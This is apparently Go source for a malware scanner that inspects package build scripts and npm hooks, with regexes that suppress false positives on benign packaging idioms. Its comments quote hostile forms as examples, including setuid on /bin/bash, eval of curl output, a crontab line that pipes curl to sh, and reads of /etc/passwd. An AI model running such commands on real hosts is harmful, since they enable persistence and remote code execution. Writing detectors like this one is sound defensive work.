package detect

import "regexp"

// Packaging idioms. A PKGBUILD (or formula, spec, ebuild) installs files into a staging root and
// tells the user what to run; the same words are hostile when they act on the HOST. Re-reading the
// 4,620 AUR advisories left after the withdrawals showed the rules below firing on the former:
//
//	chmod 4755 "$pkgdir/opt/brave.com/brave-beta/chrome-sandbox"   P-SUID-BIT           433
//	$pkgdir/usr/lib/modules/$(<version)                             P-KERNEL-MODULE-WRITE 169
//	install -Dm644 ... "${pkgdir}/etc/udev/rules.d/10-x.rules"      P-UDEV-RULE           61
//	eval "package_${pkgbase}() {                                    P-EVAL-VAR            410
//	python -c "import site; print(site.getsitepackages()[0])"       P-PYTHON-INLINE       195
//	echo "  4. Enable at boot: systemctl enable ledspicerd"           P-INSTALL-PERSISTENCE 211
//
// Chromium-family browsers REQUIRE a setuid chrome-sandbox; split packages are declared with
// `eval "package_x() {...}"`; `python -c` is how a PKGBUILD finds site-packages. None of that is a
// finding. The hostile forms are untouched: setuid on a file outside the staging root, `chmod u+s
// /bin/bash`, a kernel module or udev rule written to the real /etc, `eval "$(curl ...)"`, and
// `python -c` that does anything but ask the interpreter where it lives.

// stagingRootRE is a reference to the package staging directory ($pkgdir, ${pkgdir}, "$pkgdir").
var stagingRootRE = regexp.MustCompile(`\$\{?pkgdir\}?`)

// splitPackageEvalRE is the makepkg split-package declaration.
var splitPackageEvalRE = regexp.MustCompile(`\beval\s+"(?:package_|\$\(declare\s+-f\s+package)`)

// pythonQueryRE starts a `python -c` snippet that asks the interpreter about itself; it only
// counts when pythonHostileRE finds nothing capable anywhere on the line.
var pythonQueryRE = regexp.MustCompile(
	`python[23]?\s+-c\s+["']\s*(?:import\s+(?:site|sys|sysconfig|platform)\b|from\s+(?:distutils|sysconfig)\b)`)

var pythonHostileRE = regexp.MustCompile(
	`os\.|subprocess|urllib|requests|socket|\bexec\b|\beval\b|base64|\bopen\s*\(|__import__|system\s*\(|popen|\bpty\b|https?:|curl|wget`)

// echoedMessageRE is a line that only prints text (echo, printf, msg, plain, warning).
var echoedMessageRE = regexp.MustCompile(`^\s*(?:sudo\s+)?(?:echo|printf|msg2?|plain|warning|note)\b`)

// printedHintRE is a line whose curl/wget command sits inside a string handed to a print, log or
// error call: `console.error("... curl -fsSL https://x/install | bash")`, `errors.New("run ` +
// "`curl ... | bash`" + ` first")`, `click.echo(f"  echo ... | sudo tee ...")`. The string is a
// hint for a human; nothing runs it. The quote must open before the command and stay open up to
// it, so `echo "Installing"; curl x | sh` (the echo string closes first) is not a hint.
var printedHintRE = regexp.MustCompile(printCallOpen + `\b(?:curl|wget)\b`)

// printCallOpen is a print, log or error call followed by an open string literal that stays open
// up to whatever regex is appended to it.
const printCallOpen = `(?:\b(?:echo|printf|print|puts|say|warn|warning|die|raise|panic!?|println!?|eprintln!?|format!|console\.\w+|fmt\.\w+|errors\.New|log\.\w+|logger\.\w+|logging\.\w+|click\.s?echo|Warn|UI\.\w+|\$stderr\.puts|STDERR\.puts|\$this->(?:line|info|warn|error|comment)|Write-Host|hint|msg)\s*\(?\s*[frb]?)(?:"[^"]*|'[^']*|` + "`[^`]*" + `)`

// printedReconRE is P-SYSINFO-RECON's command inside a printed string (`log.warning("Cannot run
// 'hostname -I' on localhost")`, `errors.New("ip addr wasn't found")`), and adbShellRE runs it on an
// attached Android device (`adb shell uname -a`), which is not the host.
var (
	printedReconRE = regexp.MustCompile(printCallOpen + `\b(?:uname|lspci|dmidecode|hostname|ip\s+addr|cat\s+/proc/cpuinfo|cat\s+/etc/machine-id)\b`)
	adbShellRE     = regexp.MustCompile(`\badb\s+(?:-[sdet]\s+\S+\s+|-[de]\s+)*shell\b|\badb_shell\s*\(|["']adb["']\s*,\s*(?:["']-[sdet]["']\s*,\s*[^,]+,\s*)*["']shell["']`)
)

// suppressPrintedRecon reports whether a P-SYSINFO-RECON line only prints the command or runs it
// on an attached phone.
func suppressPrintedRecon(line string) bool {
	return adbShellRE.MatchString(line) || (!printedThenUsedRE.MatchString(line) && printedReconRE.MatchString(line))
}

// markdownCommandRE is a Markdown table row or list item that quotes the command in backticks:
// `| macOS | ` + "`curl -fsSL https://x/cli \\| sh`" + ` |`, `1. ` + "`curl ... | sh`" + `. A bare YAML list
// item (`- curl x | sh` under a CI `run:`) carries no backticks and is not matched.
var markdownCommandRE = regexp.MustCompile(
	`^\s*(?:\|.*` + "`" + `[^` + "`" + `]*\b(?:curl|wget)\b.*\|\s*$|(?:[-*+>]|\d+[.)])\s+.*` + "`" + `[^` + "`" + `]*\b(?:curl|wget)\b)`)

// suppressPrintedHint reports whether the pipe-to-shell match on line is text for a human: a string
// handed to a print or error call, or a command quoted in a Markdown table or list.
// A printed string that is then written to a file or piped to a shell (`echo "* * * * * curl x |
// sh" >> /etc/crontab`, `echo "curl x | sh" | bash`) is a payload, not a hint.
func suppressPrintedHint(line string) bool {
	if printedThenUsedRE.MatchString(line) {
		return false
	}
	return printedHintRE.MatchString(line) || markdownCommandRE.MatchString(line)
}

var printedThenUsedRE = regexp.MustCompile(`["'` + "`" + `]\s*(?:>|\|\s*(?:sudo\s+)?(?:ba|z|da)?sh\b)`)

// testAssertionRE is a line that hands the text to a test assertion: `assert x == y`,
// `assert!(...)`, `expect(...)`, R's `expect_error(...)`, `self.assertTrue(...)`. The 2026-10 audit
// found P-PASSWD-READ and P-SSH-ACCESS firing on `assert validate_slug("cat /etc/passwd") is False`
// and `expect_error(read("/etc/passwd"))`: a test that the package REFUSES the read.
var testAssertionRE = regexp.MustCompile(`^\s*assert\s|(?:^|[^\w.])(?:assert\w*!?|expect(?:_error)?|refute\w*|self\.assert\w+)\s*\(`)

// devNetHostRE pulls the host out of each /dev/tcp/<host>/ or /dev/udp/<host>/ on a line.
var devNetHostRE = regexp.MustCompile("/dev/(?:tcp|udp)/([^/\\s\"'`]+)")

// loopbackHostRE is a host that never leaves the machine.
var loopbackHostRE = regexp.MustCompile(`^(?:127\.\d{1,3}\.\d{1,3}\.\d{1,3}|localhost|0\.0\.0\.0|::1|\[::1\])$`)

// suppressLoopbackDevNet reports whether every /dev/tcp or /dev/udp host on line is loopback: a port
// probe (`exec 3<>/dev/tcp/127.0.0.1/$PORT`) or a statsd write (`> /dev/udp/127.0.0.1/8125`), not a
// connection out. A line with no extractable host is kept.
func suppressLoopbackDevNet(line string) bool {
	hosts := devNetHostRE.FindAllStringSubmatch(line, -1)
	if len(hosts) == 0 {
		return false
	}
	for _, h := range hosts {
		if !loopbackHostRE.MatchString(h[1]) {
			return false
		}
	}
	return true
}

// chownOwnerRE pulls the owner out of each chown on a line (flags skipped, group dropped).
var chownOwnerRE = regexp.MustCompile(`\bchown[ \t]+(?:-\S+[ \t]+)*["']?([^\s:."']+)`)

// suppressRootChown reports whether every chown on line gives the file to root: restoring the
// owner of /etc/shadow or /root/.ssh, which hands nothing to anyone.
func suppressRootChown(line string) bool {
	owners := chownOwnerRE.FindAllStringSubmatch(line, -1)
	if len(owners) == 0 {
		return false
	}
	for _, o := range owners {
		if o[1] != "root" && o[1] != "0" {
			return false
		}
	}
	return true
}

// buildTreeRE is the makepkg build tree ($srcdir), whose files are copied into $pkgdir, and
// chromeSandboxRE is the Chromium/Electron sandbox helper, which must be setuid root to run at all:
// `chmod u+s "${srcdir}/${_pkgname}/chrome-sandbox"`, `sudo chmod 4755 "${chromeSandboxPath}"`.
var (
	buildTreeRE     = regexp.MustCompile(`\$\{?srcdir\}?`)
	chromeSandboxRE = regexp.MustCompile(`(?i)chrome[-_]sandbox|chromeSandbox`)
)

// loopbackURLRE is a loopback host named as a URL or host:port; anyURLHostRE is any http(s) host.
var (
	loopbackURLRE = regexp.MustCompile(`(?:https?://)?(?:localhost|127\.\d{1,3}\.\d{1,3}\.\d{1,3}|0\.0\.0\.0|\[::1\])(?::|/|\b)`)
	anyURLHostRE  = regexp.MustCompile(`https?://(\[[^\]]*\]|[^/\s"'` + "`" + `:\\)\]},;|]+)`)
)

// suppressLoopbackPost reports whether a P-CURL-POST-DATA line only posts to this machine:
// `curl -s -X POST http://127.0.0.1:${port}/hook/${event} -d @-`, a dev server's `curl -X POST
// localhost:${PORT}/mock/reset`. Nothing leaves the host. A line that also names any other http(s)
// host keeps the finding.
func suppressLoopbackPost(line string) bool {
	if !loopbackURLRE.MatchString(line) {
		return false
	}
	for _, m := range anyURLHostRE.FindAllStringSubmatch(line, -1) {
		if !loopbackHostRE.MatchString(m[1]) {
			return false
		}
	}
	return true
}

// shortenerAPIRE is a shortener's own API endpoint (`https://tinyurl.com/api-create.php?url=`,
// `https://is.gd/create.php?format=simple`, `http://is.gd/api.php`): a client CREATING a short link,
// which fetches nothing hidden. shortURLRE pulls the path of each shortener URL off a line.
var (
	shortenerAPIRE = regexp.MustCompile(`^(?:api-create\.php|create\.php|api\.php|api/|v\d/shorten)`)
	shortURLRE     = regexp.MustCompile(`(?:^|[^A-Za-z0-9.-])(?:bit\.ly|tinyurl\.com|t\.co|is\.gd|v\.gd|short\.io)/(\S*)`)
)

// suppressShortenerAPI reports whether every shortener URL on line is the shortener's own API.
func suppressShortenerAPI(line string) bool {
	urls := shortURLRE.FindAllStringSubmatch(line, -1)
	if len(urls) == 0 {
		return false
	}
	for _, u := range urls {
		if !shortenerAPIRE.MatchString(u[1]) {
			return false
		}
	}
	return true
}

// homepageFieldRE is a package-metadata homepage line (`homepage "https://hastebin.com/"`).
var homepageFieldRE = regexp.MustCompile(`^\s*["']?homepage["']?\s*[:=]?\s*["']`)

// curlProbeRE is a presence probe for curl (`command -v curl >/dev/null 2>&1`, `which curl`,
// `type curl`, `hash curl`); installCurlRE is P-INSTALL-CURL's own pattern; descriptionFieldRE is a
// YAML `description:` line (a pubspec saying the package "shows requests ... with curl commands").
var (
	curlProbeRE        = regexp.MustCompile(`\b(?:command[ \t]+-v|which|type|hash)[ \t]+curl\b`)
	installCurlRE      = regexp.MustCompile(`(?:^|[^A-Za-z0-9_])curl[ \t]`)
	descriptionFieldRE = regexp.MustCompile(`^\s*description:\s`)
)

// suppressCurlProbe reports whether the only curl on line is a presence probe, or the line is a
// manifest description field. `command -v curl >/dev/null && curl -fsSL x | sh` keeps the finding.
func suppressCurlProbe(line string) bool {
	if descriptionFieldRE.MatchString(line) {
		return true
	}
	if !curlProbeRE.MatchString(line) {
		return false
	}
	return !installCurlRE.MatchString(curlProbeRE.ReplaceAllString(line, "probe"))
}

// suppressPackagingIdiom reports whether rule id's match on line is a packaging idiom.
func suppressPackagingIdiom(id, line string) bool {
	switch id {
	case "P-INSTALL-CURL":
		return suppressCurlProbe(line)
	case "P-SUID-BIT":
		return stagingRootRE.MatchString(line) || buildTreeRE.MatchString(line) || chromeSandboxRE.MatchString(line)
	case "P-CURL-POST-DATA":
		return suppressPrintedHint(line) || suppressLoopbackPost(line)
	case "P-URL-SHORTENER":
		return suppressShortenerAPI(line)
	case "P-PASTEBIN":
		return testAssertionRE.MatchString(line) || homepageFieldRE.MatchString(line)
	case "P-KERNEL-MODULE-WRITE", "P-UDEV-RULE", "P-PACMAN-HOOK", "P-SUDOERS-MOD":
		return stagingRootRE.MatchString(line)
	case "P-PASSWD-READ", "P-SSH-ACCESS", "P-GPG-ACCESS":
		return testAssertionRE.MatchString(line)
	case "P-SYSINFO-RECON":
		return suppressPrintedRecon(line)
	case "P-REVSHELL-DEVTCP", "P-DEV-UDP":
		return suppressLoopbackDevNet(line)
	case "G-CHOWN-SENSITIVE":
		return suppressRootChown(line)
	case "P-EVAL-VAR":
		return splitPackageEvalRE.MatchString(line)
	case "P-PYTHON-INLINE":
		return pythonQueryRE.MatchString(line) && !pythonHostileRE.MatchString(line)
	case "P-INSTALL-PERSISTENCE":
		return echoedMessageRE.MatchString(line)
	}
	return false
}

// jsStringLiteralLineRE is a JavaScript line that is nothing but a string literal, an element of
// an array or a piece of a + concatenation: the install hint a postinstall script prints when its
// binary download fails (`"curl -fsSL https://raw.githubusercontent.com/x/cli/install.sh | bash",`,
// `'  - or:  curl -fsSL https://… | bash\n' +`). Measured over 543 audited npm packages with
// lifecycle hooks once their hook files were judged as install code: 7 packages minted on such
// lines, all printed hints. A literal that is then written or piped (printedThenUsedRE) is still a
// payload. The cost is a command split onto its own line inside an exec call.
var jsStringLiteralLineRE = regexp.MustCompile("^\\s*(?:\\+\\s*)?(?:\"(?:[^\"\\\\]|\\\\.)*\"|'(?:[^'\\\\]|\\\\.)*'|`[^`]*`)\\s*[,+)\\]]?\\s*;?\\s*$")
